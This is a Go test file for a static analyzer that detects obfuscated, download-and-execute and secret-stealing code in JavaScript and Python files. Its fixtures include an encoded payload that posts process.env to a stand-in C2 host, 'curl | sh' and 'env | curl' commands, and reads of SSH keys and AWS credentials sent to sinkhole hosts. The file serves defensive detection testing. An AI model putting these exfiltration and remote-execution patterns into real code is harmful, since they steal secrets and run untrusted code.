package script_test

import (
	"context"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/mrdhira/galahad/internal/analyze"
	"github.com/mrdhira/galahad/internal/analyze/static/script"
	"github.com/mrdhira/galahad/internal/protocol"
)

// exfilPayload is harmless: the host is a sinkhole name that never resolves.
const exfilPayload = "const https = require('https');\n" +
	"const body = JSON.stringify(process.env);\n" +
	"https.request({ hostname: 'c2.sinkhole.test', method: 'POST' }).end(body);\n" +
	"// padding so that the encoded form is long enough to count as a blob....\n"

func b64(s string) string { return base64.StdEncoding.EncodeToString([]byte(s)) }

// unit returns n characters of base64 with 16 different characters.
func unit(n int) string { return strings.Repeat("aB3dE5fGhJ7kL9mN", n/16+1)[:n] }

func pad(n int) string { return strings.Repeat(" ", n) }

// analyzeFile runs the analyzer and returns "<rule suffix>:<line>" of the primary evidence of each finding, sorted.
func analyzeFile(t *testing.T, path, data string) ([]string, analyze.Output) {
	t.Helper()
	f := analyze.File{Path: path, Name: path[strings.LastIndex(path, "/")+1:], Data: []byte(data)}
	out, err := script.New().Analyze(context.Background(), f)
	if err != nil {
		t.Fatal(err)
	}
	var got []string
	for _, fi := range out.Findings {
		got = append(got, fmt.Sprintf("%s:%d", strings.TrimPrefix(fi.RuleID, "GAL-"), fi.Evidence[0].Line))
	}
	slices.Sort(got)
	return got, out
}

func TestAnalyze(t *testing.T) {
	tests := []struct {
		name string
		// inputs
		path string
		data string
		// expectations: "<rule without GAL->:<line>" of the primary evidence, sorted
		want []string
	}{
		{
			name: "hidden eval of an encoded payload that steals the environment",
			path: "index.js",
			data: "console.log(1);\n" + "run();" + pad(300) + "eval(atob('" + b64(exfilPayload) + "'));\n",
			want: []string{"EXFIL-001:2", "OBF-001:2", "OBF-002:2", "OBF-003:2"},
		},
		{name: "199 spaces are not padding", path: "a.js", data: "x();" + pad(199) + "y();\n"},
		{name: "200 spaces hide code", path: "a.js", data: "x();" + pad(200) + "y();\n", want: []string{"OBF-001:1"}},
		{name: "200 tabs hide code", path: "a.py", data: "x()" + strings.Repeat("\t", 200) + "y()\n", want: []string{"OBF-001:1"}},
		{name: "leading indent hides code", path: "a.ts", data: "\n" + pad(250) + "run();\n", want: []string{"OBF-001:2"}},
		{name: "trailing white space hides nothing", path: "a.js", data: "x();" + pad(400) + "\ny();\n"},
		{name: "padding before a control character is a table, not code", path: "a.js", data: "x();" + pad(300) + "\x02\x02\n"},
		{name: "padding before a comment line is not code", path: "a.js", data: "// note" + pad(300) + "more\n"},
		{name: "python comment line", path: "a.py", data: "# note" + pad(300) + "more\n"},
		{name: "mjs", path: "a.mjs", data: "x();" + pad(200) + "y();\n", want: []string{"OBF-001:1"}},
		{name: "cjs", path: "a.cjs", data: "x();" + pad(200) + "y();\n", want: []string{"OBF-001:1"}},
		{name: "jsx", path: "a.jsx", data: "x();" + pad(200) + "y();\n", want: []string{"OBF-001:1"}},
		{name: "tsx", path: "a.tsx", data: "x();" + pad(200) + "y();\n", want: []string{"OBF-001:1"}},
		{name: "upper case extension", path: "A.JS", data: "x();" + pad(200) + "y();\n", want: []string{"OBF-001:1"}},
		{name: "other extensions are not scripts", path: "a.txt", data: "x();" + pad(200) + "y();\n"},
		{name: "empty file", path: "a.js", data: ""},
		{name: "member of a container", path: "lure.zip!/setup.js", data: "x();" + pad(200) + "y();\n", want: []string{"OBF-001:1"}},

		{name: "256 character blob", path: "a.js", data: "var k = '" + unit(256) + "';\n", want: []string{"OBF-003:1"}},
		{name: "255 character run is not a blob", path: "a.js", data: "var k = '" + strings.Repeat("aB3dE5fG", 31) + "aB3dE5f';\n"},
		{name: "run of one character is not a blob", path: "a.js", data: "// " + strings.Repeat("-", 300) + "\n"},
		{name: "long name without digits is not a blob", path: "a.js", data: "var " + strings.Repeat("Some_Long_Diagnostic_Message_", 12) + " = 1;\n"},
		{name: "blob of binary data is flagged but not decoded", path: "a.py", data: "ICON = '" + base64.StdEncoding.EncodeToString(binaryBytes(300)) + "'\n", want: []string{"OBF-003:1"}},
		{name: "image data URI is data", path: "a.js", data: "var i = 'data:image/png;base64," + base64.StdEncoding.EncodeToString(binaryBytes(300)) + "';\n"},
		{name: "script data URI is a blob", path: "a.js", data: "import('data:text/javascript;base64," + b64(strings.Repeat("// x\n", 60)) + "');\n", want: []string{"OBF-003:1"}},
		{name: "hex blob that decodes to text is checked again", path: "a.js", data: "var h = '" + hex.EncodeToString([]byte(exfilPayload)) + "';\n", want: []string{"EXFIL-001:1", "OBF-003:1"}},
		{name: "decoded text gets one pass only", path: "a.js", data: "var h = '" + b64(strings.Repeat("var x = 1;\n", 20)+b64(exfilPayload)) + "';\n", want: []string{"OBF-003:1", "OBF-003:1"}},
		{name: "blob that is not base64 or hex", path: "a.js", data: "var s = '" + strings.Repeat("ab cd ", 100) + "';\n"},

		{name: "eval of atob", path: "a.js", data: "eval(atob('aGk='));\n", want: []string{"OBF-002:1"}},
		{name: "new Function of atob", path: "a.js", data: "const f = new Function(atob(x));\n", want: []string{"OBF-002:1"}},
		{name: "eval of a base64 buffer", path: "a.js", data: "eval(Buffer.from(x, 'base64').toString());\n", want: []string{"OBF-002:1"}},
		{name: "eval of a hex buffer", path: "a.js", data: "eval(Buffer.from(x, 'hex').toString());\n", want: []string{"OBF-002:1"}},
		{name: "eval of char codes", path: "a.js", data: "eval(String.fromCharCode(97, 108));\n", want: []string{"OBF-002:1"}},
		{name: "eval of inflated data", path: "a.js", data: "eval(zlib.inflateSync(x).toString());\n", want: []string{"OBF-002:1"}},
		{name: "string timer of atob", path: "a.js", data: "setTimeout(atob(x), 10);\n", want: []string{"OBF-002:1"}},
		{name: "timer with a function is code", path: "a.js", data: "setTimeout(function () { return atob(x); }, 10);\n"},
		{name: "timer with an arrow function is code", path: "a.js", data: "setInterval(() => atob(x), 10);\n"},
		{name: "decoded variable reaches eval", path: "a.js", data: "const s = atob(x);\nwork();\neval(s);\n", want: []string{"OBF-002:3"}},
		{name: "variable assigned again is not decoded", path: "a.js", data: "let s = atob(x);\ns = 'alert(1)';\neval(s);\n"},
		{name: "python exec of b64decode", path: "a.py", data: "exec(base64.b64decode(x))\n", want: []string{"OBF-002:1"}},
		{name: "python exec of zlib and base64", path: "a.py", data: "exec(zlib.decompress(base64.b64decode(x)))\n", want: []string{"OBF-002:1"}},
		{name: "python exec of marshal", path: "a.py", data: "exec(marshal.loads(x))\n", want: []string{"OBF-002:1"}},
		{name: "python exec of hex", path: "a.py", data: "exec(bytes.fromhex(x))\n", want: []string{"OBF-002:1"}},
		{name: "python decoded variable reaches exec", path: "a.py", data: "code = base64.b64decode(x)\nexec(code)\n", want: []string{"OBF-002:2"}},
		{name: "python exec of compiled source", path: "a.py", data: "exec(compile(src, 'x', 'exec'))\n"},
		{name: "python model.eval is not eval", path: "a.py", data: "model.eval()\nvalue = ast.literal_eval(text)\n"},
		{name: "eval of a literal", path: "a.js", data: "eval(\"var a = atob('x');\");\n"},
		{name: "Function of literals", path: "a.js", data: "var g = Function('return this')();\nvar h = Function('a', 'b', 'return a + b');\n"},
		{name: "regex exec is not a sink in js", path: "a.js", data: "var m = /a(b)/.exec(atob(x));\n"},
		{name: "minified library line", path: "lib.min.js", data: `!function(t){var e=Function("return this")()||this,n=(0,eval)("this");function r(t){return String.fromCharCode.apply(null,t)}function o(t){return"function"==typeof atob?atob(t):t}t.lib={r:r,o:o,g:e,n:n,s:setTimeout(function(){o("x")},0)}}(this);` + "\n"},
		{name: "download assigned then evaluated", path: "a.py", data: "code = requests.get(url).text\nexec(code)\n", want: []string{"EXEC-001:2"}},
		{name: "eval of a fetched body", path: "a.js", data: "eval(await (await fetch(url)).text());\n", want: []string{"EXEC-001:1"}},

		{name: "download piped to sh in a command string", path: "a.js", data: "const cp = require('child_process');\ncp.execSync('curl -fsSL https://x.sinkhole.test/i.sh | sh');\n", want: []string{"EXEC-001:2", "EXEC-002:2"}},
		{name: "decode piped to sh in a command string", path: "a.js", data: "const cp = require('child_process');\ncp.exec('echo aGk= | base64 -d | sh');\n", want: []string{"EXEC-002:2", "OBF-002:2"}},
		{name: "spawn without child_process is some other function", path: "a.js", data: "spawn('node');\nfork();\n"},
		{name: "destructured spawn", path: "a.js", data: "const { spawn } = require('child_process');\nspawn('ls');\n", want: []string{"EXEC-002:2"}},
		{name: "regex exec in a file that spawns", path: "a.js", data: "const cp = require('child_process');\nvar m = re.exec(text);\n"},
		{name: "python os.system", path: "a.py", data: "os.system('ls')\n", want: []string{"EXEC-002:1"}},
		{name: "python subprocess", path: "a.py", data: "subprocess.run(['ls'])\n", want: []string{"EXEC-002:1"}},
		{name: "commented out download", path: "a.py", data: "# curl https://x.sinkhole.test/i.sh | sh\n"},
		{name: "download in a block comment", path: "a.js", data: "/*\n * curl https://x.sinkhole.test/i.sh | sh\n */\n"},
		{name: "embedded package manifest scripts are data", path: "a.js", data: `var m={"scripts":{"up":"curl -o list.dat https://a.sinkhole.test/list.dat && ./gen.js"}};` + "\n"},
		{name: "list of PowerShell aliases", path: "a.py", data: "aliases = 'h history icm iex ihy ii ipal ipcsv ipmo ipsn irm ise iwmi iwr kill lp'\n"},
		{name: "method definition named exec", path: "a.js", data: "const cp = require('child_process');\nclass Cmd {\n  async exec (args) {\n    return 1;\n  }\n}\nfunction spawn(command) {\n}\n"},

		{name: "env file read and https request", path: "setup.js", data: "const fs = require('fs');\nconst https = require('https');\nconst env = fs.readFileSync('../.env', 'utf8');\nhttps.request({ hostname: 'c.sinkhole.test' }).end(env);\n", want: []string{"EXFIL-001:3"}},
		{name: "env file read and a request through an inline require", path: "setup.js", data: "const env = fs.readFileSync(\"../.env\");\nrequire(\"https\").request({ host: \"c.sinkhole.test\" }).end(env);\n", want: []string{"EXFIL-001:1"}},
		{name: "dotenv config is not a read", path: "a.js", data: "require('dotenv').config({ path: '.env' });\nfetch(url);\n"},
		{name: "env example is not a secret", path: "a.js", data: "const t = fs.readFileSync('.env.example', 'utf8');\nfetch(url);\n"},
		{name: "env file mentioned without a read", path: "a.js", data: "const name = '.env';\nfetch(url);\n"},
		{name: "NODE_ENV and fetch", path: "a.js", data: "const prod = process.env.NODE_ENV === 'production';\nfetch(url);\n"},
		{name: "env parameter is not a dump", path: "a.js", data: "module.exports = (env) => ({ mode: env });\nfetch(url);\n"},
		{name: "api key and fetch", path: "a.js", data: "const key = process.env.API_KEY;\nfetch(url, { headers: { key } });\n", want: []string{"EXFIL-002:1"}},
		{name: "api key and fetch on one line", path: "a.js", data: "fetch(url, { headers: { key: process.env.API_KEY } });\n", want: []string{"EXFIL-002:1"}},
		{name: "api key without network", path: "a.js", data: "const key = process.env.API_KEY;\n"},
		{name: "environment dump next to a request", path: "a.js", data: "const d = JSON.stringify(process.env);\nfetch(url, { method: 'POST', body: d });\n", want: []string{"EXFIL-001:1"}},
		{name: "environment dump far from the request", path: "a.js", data: "const d = JSON.stringify(process.env);\n" + strings.Repeat("work();\n", 120) + "fetch(url, { body: d });\n"},
		{name: "python environment dump and requests", path: "a.py", data: "data = dict(os.environ)\nrequests.post(url, json=data)\n", want: []string{"EXFIL-001:1"}},
		{name: "python environment copy for a child", path: "a.py", data: "env = os.environ.copy()\nrequests.get(url)\n"},
		{name: "python json dump of the environment", path: "a.py", data: "body = json.dumps(dict(os.environ))\nurllib.request.urlopen(url, body)\n", want: []string{"EXFIL-001:1"}},
		{name: "aws credentials and requests", path: "a.py", data: "p = os.path.expanduser('~/.aws/credentials')\nrequests.post(url, data=open(p).read())\n", want: []string{"EXFIL-001:1"}},
		{name: "ssh key and socket", path: "a.py", data: "key = open(home + '/.ssh/id_rsa').read()\ns = socket.socket()\n", want: []string{"EXFIL-001:1"}},
		{name: "credential path without network", path: "a.py", data: "key = open(home + '/.ssh/id_rsa').read()\n"},
		{name: "credential path far from the network use", path: "a.py", data: "key = open(home + '/.ssh/id_rsa').read()\n" + strings.Repeat("work()\n", 150) + "requests.get(url)\n"},
		{name: "credential path in help text and scp in prose", path: "a.py", data: "help = 'copy ~/.ssh/id_rsa to the host, then scp the files'\n"},
		{name: "credential path in an scp command", path: "a.py", data: "run('scp -r ~/.ssh/id_rsa user@host.sinkhole.test:/tmp')\n", want: []string{"EXFIL-001:1"}},
		{name: "fetch as a method of another object", path: "a.js", data: "const key = process.env.API_KEY;\nfetcher.fetch(url);\n"},
		{name: "fetch as a method of window", path: "a.js", data: "const key = process.env.API_KEY;\nwindow.fetch(url);\n", want: []string{"EXFIL-002:1"}},
		{name: "fetch definition", path: "a.js", data: "const key = process.env.API_KEY;\nasync function fetch(url) {\n}\n"},
		{name: "fetch without secrets", path: "a.js", data: "fetch('https://api.example.test/items').then((r) => r.json());\n"},
		{name: "secret shell variable and curl in a command", path: "a.js", data: "run('curl -H \"X-Key: $API_TOKEN\" https://a.sinkhole.test');\n", want: []string{"EXFIL-002:1"}},
		{name: "env dump piped on by a command", path: "a.js", data: "run('env | curl -d @- https://a.sinkhole.test');\n", want: []string{"EXFIL-001:1"}},
		{name: "network use in a comment", path: "a.js", data: "const d = JSON.stringify(process.env);\n// fetch(url)\n"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, _ := analyzeFile(t, tt.path, tt.data)

			if !slices.Equal(got, tt.want) {
				t.Errorf("findings = %v, want %v", got, tt.want)
			}
		})
	}
}

// binaryBytes returns n bytes that are not text.
func binaryBytes(n int) []byte {
	b := make([]byte, n)
	for i := range b {
		b[i] = byte(i*7+0x80) | 0x80
	}
	return b
}

func TestEvidence(t *testing.T) {
	tests := []struct {
		name string
		// inputs
		path string
		data string
		// expectations
		wantRule     string
		wantEvidence []protocol.Evidence
	}{
		{
			name:         "padding snippet starts at the hidden code",
			path:         "index.js",
			data:         "a();\nlisten();" + pad(300) + "run();\n",
			wantRule:     "GAL-OBF-001",
			wantEvidence: []protocol.Evidence{{Path: "index.js", Line: 2, Snippet: "run();"}},
		},
		{
			name:     "decoded finding points at the literal line and keeps the decoded text",
			path:     "index.js",
			data:     "a();\nvar p = '" + b64(exfilPayload) + "';\n",
			wantRule: "GAL-EXFIL-001",
			wantEvidence: []protocol.Evidence{
				{Path: "index.js", Line: 2, Snippet: "decoded: const body = JSON.stringify(process.env);"},
				{Path: "index.js", Line: 2, Snippet: "decoded: https.request({ hostname: 'c2.sinkhole.test', method: 'POST' }).end(body);"},
			},
		},
		{
			name:     "secret line first and network line second",
			path:     "lure.eml!/setup.js",
			data:     "const fs = require('fs');\nconst e = fs.readFileSync('../.env');\nwork();\nhttps.request(o).end(e);\n",
			wantRule: "GAL-EXFIL-001",
			wantEvidence: []protocol.Evidence{
				{Path: "lure.eml!/setup.js", Line: 2, Snippet: "const e = fs.readFileSync('../.env');"},
				{Path: "lure.eml!/setup.js", Line: 4, Snippet: "https.request(o).end(e);"},
			},
		},
		{
			name:     "variable assignment is the second evidence",
			path:     "a.py",
			data:     "code = base64.b64decode(x)\nwork()\nexec(code)\n",
			wantRule: "GAL-OBF-002",
			wantEvidence: []protocol.Evidence{
				{Path: "a.py", Line: 3, Snippet: "exec(code)"},
				{Path: "a.py", Line: 1, Snippet: "code = base64.b64decode(x)"},
			},
		},
		{
			name:         "match deep in a long line shows its neighbourhood",
			path:         "a.js",
			data:         strings.Repeat("a=1;", 500) + "eval(atob(x));" + strings.Repeat("b=2;", 10) + "\n",
			wantRule:     "GAL-OBF-002",
			wantEvidence: []protocol.Evidence{{Path: "a.js", Line: 1, Snippet: strings.Repeat("a=1;", 15) + "eval(atob(x));" + strings.Repeat("b=2;", 10)}},
		},
		{
			name:         "control characters in the snippet are cleaned",
			path:         "a.js",
			data:         "eval(atob('\x1b[31m'));\r\n",
			wantRule:     "GAL-OBF-002",
			wantEvidence: []protocol.Evidence{{Path: "a.js", Line: 1, Snippet: `eval(atob('\u001b[31m'));`}},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, out := analyzeFile(t, tt.path, tt.data)

			for _, fi := range out.Findings {
				if fi.RuleID == tt.wantRule {
					if !slices.Equal(fi.Evidence, tt.wantEvidence) {
						t.Errorf("evidence = %+v, want %+v", fi.Evidence, tt.wantEvidence)
					}
					return
				}
			}
			t.Errorf("no %s in %+v", tt.wantRule, out.Findings)
		})
	}
}

func TestAnalyzeCapsFindings(t *testing.T) {
	tests := []struct {
		name string
		// inputs
		data string
		// expectations
		wantRule  string
		wantCount int
	}{
		{name: "padded lines", data: strings.Repeat("x();"+pad(200)+"y();\n", 30), wantRule: "GAL-OBF-001", wantCount: protocol.MaxFindingsPerRulePerFile},
		{name: "decoded eval calls", data: strings.Repeat("eval(atob(x));\n", 30), wantRule: "GAL-OBF-002", wantCount: protocol.MaxFindingsPerRulePerFile},
		{name: "blobs", data: strings.Repeat("var k = '"+unit(256)+"';\n", 30), wantRule: "GAL-OBF-003", wantCount: protocol.MaxFindingsPerRulePerFile},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, out := analyzeFile(t, "a.js", tt.data)

			n := 0
			for _, fi := range out.Findings {
				if fi.RuleID == tt.wantRule {
					n++
				}
			}
			if n != tt.wantCount {
				t.Errorf("%s findings = %d, want %d", tt.wantRule, n, tt.wantCount)
			}
		})
	}
}

// TestAnalyzeLimits checks that huge lines stay linear: the analysis finishes
// within the bound, finds what is there and reports no skip.
func TestAnalyzeLimits(t *testing.T) {
	minified := `!function(t){var e=Function("return this")()||this;function r(t){return String.fromCharCode.apply(null,t)}t.lib={r:r,g:e,s:setTimeout(function(){r([97])},0)}}(this);`
	tests := []struct {
		name string
		// inputs
		path string
		data string
		// expectations
		wantRules   []string
		wantSkipped bool
	}{
		{name: "3 MB minified line", path: "big.min.js", data: strings.Repeat(minified, 3<<20/len(minified)) + "\n"},
		{name: "1 MB run of spaces before code", path: "pad.js", data: "a();" + pad(1<<20) + "b();\n", wantRules: []string{"OBF-001:1"}},
		{name: "1 MB run of spaces only", path: "pad.js", data: pad(1 << 20)},
		{name: "payload at the end of a 2 MB line", path: "big.js", data: strings.Repeat(minified, 2<<20/len(minified)) + "eval(atob(x));\n", wantRules: []string{"OBF-002:1"}},
		{name: "payload across a window cut", path: "cut.js", data: strings.Repeat(";", 256<<10-4) + "eval(atob(x));\n", wantRules: []string{"OBF-002:1"}},
		{name: "1 MB of unclosed calls", path: "eval.js", data: strings.Repeat("eval(", 1<<20/5), wantSkipped: true},
		{name: "2 MB blob on one line", path: "blob.js", data: "var x='" + unit(2<<20) + "';\n", wantRules: []string{"OBF-003:1"}},
		{name: "many assignments to look back through", path: "assign.py", data: strings.Repeat("a=", 2<<20) + "\nexec(a)\n"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			start := time.Now()
			got, out := analyzeFile(t, tt.path, tt.data)

			if d := time.Since(start); d > 20*time.Second {
				t.Errorf("took %v", d)
			}
			if !slices.Equal(got, tt.wantRules) {
				t.Errorf("findings = %v, want %v", got, tt.wantRules)
			}
			if skipped := len(out.Skips) > 0; skipped != tt.wantSkipped {
				t.Errorf("skips = %v, want skipped %v", out.Skips, tt.wantSkipped)
			}
		})
	}
}

// expiring is a context that reports itself done after its first Err call.
type expiring struct {
	context.Context
	calls int
}

func (c *expiring) Err() error {
	c.calls++
	if c.calls > 1 {
		return context.DeadlineExceeded
	}
	return nil
}

func TestAnalyzeCancelled(t *testing.T) {
	tests := []struct {
		name string
		// inputs
		data string
		// expectations
		wantErr error
	}{
		{name: "context already ended", data: "eval(atob(x));\n", wantErr: context.Canceled},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx, cancel := context.WithCancel(context.Background())
			cancel()

			_, err := script.New().Analyze(ctx, analyze.File{Path: "a.js", Name: "a.js", Data: []byte(tt.data)})

			if err != tt.wantErr {
				t.Errorf("err = %v, want %v", err, tt.wantErr)
			}
		})
	}
}

func TestAnalyzeTimeout(t *testing.T) {
	tests := []struct {
		name string
		// inputs
		data string
		// expectations
		wantReason string
	}{
		{name: "context ends while scanning", data: "x();" + pad(300) + "eval(atob(x));\n", wantReason: protocol.SkipTimeout},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			f := analyze.File{Path: "a.js", Name: "a.js", Data: []byte(tt.data)}

			out, err := script.New().Analyze(&expiring{Context: context.Background()}, f)

			if err != nil {
				t.Fatal(err)
			}
			if len(out.Skips) != 1 || out.Skips[0].Reason != tt.wantReason || out.Skips[0].Path != "a.js" {
				t.Errorf("skips = %v, want one %s for a.js", out.Skips, tt.wantReason)
			}
		})
	}
}

func TestName(t *testing.T) {
	tests := []struct {
		name     string
		wantName string
	}{
		{name: "analyzer name", wantName: "script"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := script.New().Name(); got != tt.wantName {
				t.Errorf("Name = %q, want %q", got, tt.wantName)
			}
		})
	}
}
